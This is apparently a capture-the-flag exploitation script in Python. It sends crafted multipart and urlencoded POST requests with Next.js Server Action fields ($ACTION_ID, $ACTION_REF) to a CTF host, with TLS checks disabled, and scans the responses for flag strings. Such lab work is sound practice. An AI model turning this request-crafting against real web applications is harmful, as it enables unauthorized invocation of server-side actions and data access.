#!/usr/bin/env python3
"""Drill deeper into the Server Action path.

Idea: Next.js form fallback for Server Actions reads `$ACTION_ID_<id>` from a
multipart form body. We also include action args using nested fields.
"""
import urllib.request
import urllib.error
import ssl
import json

URL = "https://funicular-gm2cxozn.alfactf.ru/"
ACTION_ID = "40c6382106bb726484f31b3ebc21b7476819a1cccf"

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE


def request(method, url, headers=None, body=None):
    req = urllib.request.Request(url, data=body, method=method, headers=headers or {})
    try:
        with urllib.request.urlopen(req, context=ctx, timeout=30) as resp:
            return resp.status, dict(resp.headers), resp.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read()


def multipart(fields):
    boundary = "----X1234ABC"
    parts = []
    for name, value in fields.items():
        parts.append(f"--{boundary}\r\n".encode())
        parts.append(
            f'Content-Disposition: form-data; name="{name}"\r\n\r\n'.encode()
        )
        if isinstance(value, str):
            value = value.encode()
        parts.append(value)
        parts.append(b"\r\n")
    parts.append(f"--{boundary}--\r\n".encode())
    return boundary, b"".join(parts)


def show(label, status, hdrs, data):
    print(f"\n=== {label} status={status} bytes={len(data)} ===")
    for k, v in hdrs.items():
        if k.lower() in ("content-type", "x-action-error", "set-cookie", "x-nextjs-redirect", "x-next-action", "location"):
            print(f"  {k}: {v}")
    snippet = data[:1500]
    try:
        s = snippet.decode("utf-8", "replace")
    except Exception:
        s = repr(snippet)
    print(s)


# 1) $ACTION_ID with empty body
boundary, body = multipart({f"$ACTION_ID_{ACTION_ID}": ""})
status, h, data = request("POST", URL, {"Content-Type": f"multipart/form-data; boundary={boundary}", "Accept": "text/x-component"}, body)
# Look for "restored" in response
print("$ACTION_ID empty -> 'restored':", b'"restored":true' in data, "len=", len(data))
# search for any new strings
for needle in (b"alfa{", b"flag", b"FLAG", b"recover", b"backup", b"south-line", b"WO-17", b"\xd0\xa3\xd0\xa1\xd0\x9f\xd0\x95\xd0\xa5"):
    if needle in data:
        idx = data.find(needle)
        print(f"  found {needle!r} at {idx}: {data[max(0,idx-40):idx+200]!r}")

# 2) $ACTION_REF_ with action-server bound state value (encoded as JSON)
# The original payload showed: 5:{"id":"40c6...","bound":null}
# Let's try sending a form similar to RSC bound action reference
for ref_value in ("", "null", "[]", "{}", json.dumps({"id": ACTION_ID, "bound": None})):
    boundary, body = multipart({f"$ACTION_REF_{ACTION_ID}": ref_value})
    status, h, data = request("POST", URL, {"Content-Type": f"multipart/form-data; boundary={boundary}"}, body)
    show(f"$ACTION_REF value={ref_value!r}", status, h, data)

# 3) $ACTION_KEY_<id> + $ACTION_BOUND_<id>
boundary, body = multipart({
    f"$ACTION_ID_{ACTION_ID}": "",
    "$ACTION_1": "",  # arg 0
})
status, h, data = request("POST", URL, {"Content-Type": f"multipart/form-data; boundary={boundary}", "Accept": "text/x-component"}, body)
show("$ACTION_ID + $ACTION_1", status, h, data)

# 4) URL-encoded form
import urllib.parse
form = urllib.parse.urlencode({f"$ACTION_ID_{ACTION_ID}": ""}).encode()
status, h, data = request("POST", URL, {"Content-Type": "application/x-www-form-urlencoded", "Accept": "text/x-component"}, form)
show("urlencoded $ACTION_ID", status, h, data)
